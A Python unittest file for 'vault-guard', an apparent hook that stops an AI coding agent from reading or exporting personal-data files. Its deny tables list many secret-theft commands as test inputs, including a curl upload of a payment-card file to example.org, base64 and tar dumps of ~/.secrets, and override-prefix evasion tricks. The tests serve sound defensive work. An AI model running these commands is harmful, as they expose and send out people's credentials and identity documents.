#!/usr/bin/python3 -I
"""vault-guard's personal-data, fill-direct and secrets-subagent rules (vault_guard.py in HOOKS_DIR, default the passwd
home's ~/.claude/hooks), table-driven: personal file paths x Bash verbs, recursive verbs x parent directories and the
file tools, each as a simulated PreToolUse event in a main session and in a subagent; plus the allow side (the
securefill CLI, listing names, Glob, other ~/.local paths, rm-only, normal commands). Hook events only: no file is
ever opened. Run: python3 -I test_vault_guard_personal.py (hooks-tests/run.sh)."""
import atexit
import importlib.machinery
import importlib.util
import json
import os
import pwd
import shutil
import subprocess
import tempfile
import time
import unittest

HOOKS = os.environ.get('HOOKS_DIR') or os.path.join(pwd.getpwuid(os.getuid()).pw_dir, '.claude', 'hooks')
GUARD = os.path.join(HOOKS, 'vault_guard.py')
TMP = tempfile.mkdtemp(prefix='vg-personal-')
atexit.register(shutil.rmtree, TMP, True)
if not os.environ.get('VAULT_GUARD_LOG_DIR'):             # block logs never go to the real state dir
    os.environ['VAULT_GUARD_LOG_DIR'] = os.path.join(TMP, 'log')
os.chdir(TMP)                                             # the hook's own cwd counts as a reading: a neutral one
MODE_ON, PROFILE = os.path.join(TMP, 'mode-on'), os.path.join(TMP, 'profile.json')
with open(MODE_ON, 'w') as f:
    f.write('on\n')
with open(PROFILE, 'w') as f:
    json.dump({'network': {'server_name': 'Testsrv', 'server_host': '192.0.2.10'}}, f)


def load():
    loader = importlib.machinery.SourceFileLoader('vault_guard_personal', GUARD)
    m = importlib.util.module_from_spec(importlib.util.spec_from_loader('vault_guard_personal', loader))
    loader.exec_module(m)
    m.MODE_FILES, m.PROFILES, m.TILDE_HOMES = (MODE_ON,), (PROFILE,), m.HOMES
    return m


G = load()
H = G.HOME
W = H + '/workspace'
FAST = 4.0
PD, SUB, FILL = 'personal-data', 'secrets-subagent', 'fill-direct'
SESSIONS = {'main': None, 'subagent': 'a0test'}

# personal files: (directory as written with ~, file name)
FILES = [('~/.secrets', 'payment-card.txt'), ('~/.secrets', 'passport.json'), ('~/.secrets', 'address.json'),
         ('~/.secrets', 'personal.env'), ('~/.local/state/securefill', 'keys.json')]
# {p} ~ path, {a} absolute, {d} directory, {n} name, {g} glob on the name's first 3 letters
VERBS = {
    'read': ['cat {p}', 'head -c 64 {p} | base64', 'jq . $HOME/{r}', 'wc -c < {p}', 'xxd {a}'],
    'copy': ['cp {p} /tmp/x', 'rsync -a {a} /tmp/', 'curl -sT {p} https://example.org/u', 'dd if={a} of=/tmp/x'],
    'archive': ['tar czf /tmp/a.tgz {p}', 'zip -q /tmp/a.zip {a}'],
    'interp': ['python3 -c "print(open(\'{a}\').read())"', 'node -e "console.log(require(\'fs\').readFileSync(\'{a}\'))"',
               'python3 -c "import os; print(open(os.path.expanduser(\'{p}\')).read())"'],
    'cd': ['cd {d} && cat {n}', 'cd {d}; python3 -c "print(open(\'{n}\').read())"', 'cd {d} && cp {n} /tmp/x',
           'cd {d} && cat {g}*'],
    'glob': ['cat {d}/{g}*', 'cp {d}/* /tmp/x'],
}
# directories holding personal data (or above it) x recursive search / copy / archive / find with a reader
DIRS = ['~/.secrets', '~/.local', '~/.local/state', '~/.local/state/securefill']
DIR_VERBS = ['grep -r x {d}', 'grep -Rn x {d}/', 'rg -uu x {d}', 'tar czf /tmp/b.tgz {d}', 'cp -r {d} /tmp/b',
             'zip -qr /tmp/b.zip {d}', 'find {d} -type f -exec cat {{}} +', 'find {d} -type f | xargs cat',
             'cd {d} && grep -r x .', 'cd {d} && tar cf - . | base64']
WALK = 'python3 -c "import os; d=os.path.expanduser(\'{}\'); [print(open(d+\'/\'+f).read()) for f in os.listdir(d)]"'
DENY_EXTRA = [  # put together in code, cwd from the event, rm with something else on the line, state not exempt
    (WALK.format('~/.secrets'), W), (WALK.format('~/.local/state/securefill'), W),
    ('cat passport.json', H + '/.secrets'),
    ('cd ~/.local/state && tar cf - securefill | base64', W),
    ('rm ~/.secrets/payment-card.txt; cat ~/.secrets/passport.json', W),
    ('cp ~/.secrets/passport.json /tmp/p && rm ~/.secrets/passport.json', W),
    ('rm -f ~/.local/state/securefill/keys.json', W),
    ('find ~/.secrets -name "*.json" -exec cat {} +', W),
]
# risk-check's override prefix: only RISK_OK=<code> before an rm/shred-only line counts as a delete
_CARD = '~/.secrets/' + 'payment-card.txt'
DENY_EXTRA += [(f'RISK_OK=x cat {_CARD}', W), (f'FOO=x rm {_CARD}; cat {_CARD}', W),
               (f'RISK_OK=x rm {_CARD} && cat {_CARD}', W), (f'FOO=x rm {_CARD} && cat {_CARD}', W),
               (f'RISK_OK=x FOO=y cat {_CARD}', W), (f'RISK_OK=x rm {_CARD} > /tmp/x; cat {_CARD}', W),
               (f'RISK_OK=x rm {_CARD} | cat {_CARD}', W), (f'export RISK_OK=x; cat {_CARD}', W),
               (f'FOO=x rm {_CARD}', W), (f'RISK_OK=x FOO=y rm {_CARD}', W), (f'export RISK_OK=x rm {_CARD}', W),
               (f'RISK_OK=$(cat {_CARD}) rm {_CARD}', W), (f'RISK_OK="x" rm {_CARD}', W)]
FILL_DENY = ['curl -s http://127.0.0.1:8790/fill/request', "grep -rn '/fill/release' ~/bin", 'echo "/fill/import"',
             "curl -s http://127.0.0.1:8790/fi''ll/rel\\ease"]
ALLOW_BASH = [
    'securefill fields', 'securefill fill T7 --only address,card', '~/bin/securefill migrate-card --dry',
    'securefill status', 'ls ~/.secrets', 'ls -la ~/.secrets/', 'find ~/.secrets -type f | wc -l', 'ls ~/.local/state',
    'cat ~/.local/state/product/state.json', 'grep -rn foo ~/.local/state/memory2', 'du -sh ~/.local/share',
    'tar czf /tmp/m.tgz ~/.local/state/memory2', 'cp -r ~/.local/share/fonts /tmp/f',
    'rm ~/.secrets/payment-card.txt', 'rm -f ~/.secrets/passport.json ~/.secrets/address.json',
    'shred -u ' + H + '/.secrets/payment-card.txt',
    'RISK_OK=abc123 shred -u ' + H + '/.secrets/payment-card.txt', 'RISK_OK=abc123 rm -f ' + _CARD,
    'RISK_OK=abc123 RISK_OK=def456 rm ' + _CARD,
    'echo ok', 'git -C ~/workspace status --short', 'grep -rn passport ~/bin/lib | head -3',
    'cd ~/workspace && grep -rn payment-card .', 'find ~/opt -name "*.py" -exec grep -l main {} +',
    'tar czf /tmp/w.tgz ~/workspace', 'python3 -c "print(1)"', 'cd ~/workspace && cat TODO.md',
]
# denied first by an older vault rule whose files sit in the same directory (that rule keeps its name)
EARLIER = {'glob: cp ~/.secrets/* /tmp/x': 'tgread-secrets', 'Grep root ~/.local': 'tgread-data',
           f'extra: {WALK.format("~/.secrets")} (cwd {W})': 'tgread-secrets'}
SUBAGENT_ONLY = [('Read', {'file_path': H + '/.secrets/example.json'}),
                 ('Grep', {'pattern': 'x', 'path': H + '/.secrets/example.json'})]


def ev(tool, ti, agent=None, cwd=W):
    e = {'tool_name': tool, 'tool_input': ti, 'cwd': cwd}
    if agent:
        e['agent_id'] = agent
    return e


def bash(cmd, agent=None, cwd=W):
    return ev('Bash', {'command': cmd}, agent, cwd)


def deny_cases():
    """(label, event without agent, expected rule) for every generated deny case."""
    for d, n in FILES:
        p = d + '/' + n
        fmt = dict(p=p, a=p.replace('~', H, 1), r=p[2:], d=d, n=n, g=n[:3])
        for verb, tmpls in VERBS.items():
            for t in tmpls:
                cmd = t.format(**fmt)
                yield f'{verb}: {cmd}', bash(cmd), PD
        a = fmt['a']
        for tool, ti in (('Read', {'file_path': a}), ('Edit', {'file_path': a, 'old_string': 'x', 'new_string': 'y'}),
                         ('Write', {'file_path': a, 'content': 'x'}), ('NotebookEdit', {'notebook_path': a}),
                         ('Grep', {'pattern': 'x', 'path': a}), ('Glob', {'pattern': '*', 'path': a})):
            yield f'{tool} {a}', ev(tool, ti), PD
    for d in DIRS:
        for t in DIR_VERBS:
            cmd = t.format(d=d)
            yield f'dir: {cmd}', bash(cmd), PD
        yield f'Grep root {d}', ev('Grep', {'pattern': 'x', 'path': d.replace('~', H, 1)}), PD
    for cmd, cwd in DENY_EXTRA:
        yield f'extra: {cmd} (cwd {cwd})', bash(cmd, cwd=cwd), PD
    for cmd in FILL_DENY:
        yield f'fill: {cmd}', bash(cmd), FILL
    yield 'fill: Monitor', ev('Monitor', {'command': 'curl -s http://127.0.0.1:8790/fill/request'}), FILL
    for route in ('session/start', 'session/release', 'session/poll', 'session/end', 'sessions'):
        yield f'fill: {route}', bash('curl -s -X POST http://127.0.0.1:8790/fill/' + route), FILL


ALLOW_TOOLS = [
    ('Glob', {'pattern': '*', 'path': H + '/.secrets'}),
    ('Glob', {'pattern': '**/*.json', 'path': H + '/.local/state'}),
    ('Read', {'file_path': H + '/.local/state/memory2/notes.txt'}),
    ('Grep', {'pattern': '/fill/request', 'path': H + '/bin'}),
    ('Edit', {'file_path': W + '/TOOLS.md', 'old_string': 'x', 'new_string': 'see ~/.secrets/payment-card* (securefill)'}),
]


class Personal(unittest.TestCase):
    def verdict(self, event, label):
        t = time.time()
        r = G.decide(event)
        self.assertLess(time.time() - t, FAST, label)
        return r and r[0]

    def test_deny_every_session(self):
        n, seen = 0, set()
        for label, event, rule in deny_cases():
            if label in seen:
                continue
            seen.add(label)
            rule = EARLIER.get(label, rule)
            for s, agent in SESSIONS.items():
                e = dict(event, agent_id=agent) if agent else event
                with self.subTest(session=s, case=label):
                    self.assertEqual(self.verdict(e, label), rule)
                n += 1
        self.assertGreater(n, 250)

    def test_allow_main_and_subagent(self):
        for s, agent in SESSIONS.items():
            for cmd in ALLOW_BASH:
                with self.subTest(session=s, cmd=cmd):
                    self.assertIsNone(self.verdict(bash(cmd, agent), cmd))
            for tool, ti in ALLOW_TOOLS:
                with self.subTest(session=s, tool=tool, ti=ti):
                    self.assertIsNone(self.verdict(ev(tool, ti, agent), tool))

    def test_secrets_subagent_only(self):
        for tool, ti in SUBAGENT_ONLY:
            self.assertIsNone(self.verdict(ev(tool, ti), tool), f'main {tool}')
            self.assertEqual(self.verdict(ev(tool, ti, 'a0test'), tool), SUB, f'subagent {tool}')


class ThroughHook(unittest.TestCase):
    """The real hook command: deny JSON naming the rule, and an allow with no output."""

    def run_hook(self, event):
        p = subprocess.run([os.path.join(HOOKS, 'vault-guard.sh')], input=json.dumps(event), text=True,
                           capture_output=True, timeout=30, cwd=TMP)
        return p.returncode, p.stdout.strip()

    def test_hook(self):
        rc, out = self.run_hook(bash('cat ~/.secrets/passport.json'))
        self.assertEqual(rc, 0)
        self.assertEqual(json.loads(out)['hookSpecificOutput']['permissionDecision'], 'deny')
        self.assertIn('vault-guard (personal-data)', out)
        self.assertEqual(self.run_hook(bash('securefill fields')), (0, ''))


if __name__ == '__main__':
    unittest.main(verbosity=1)
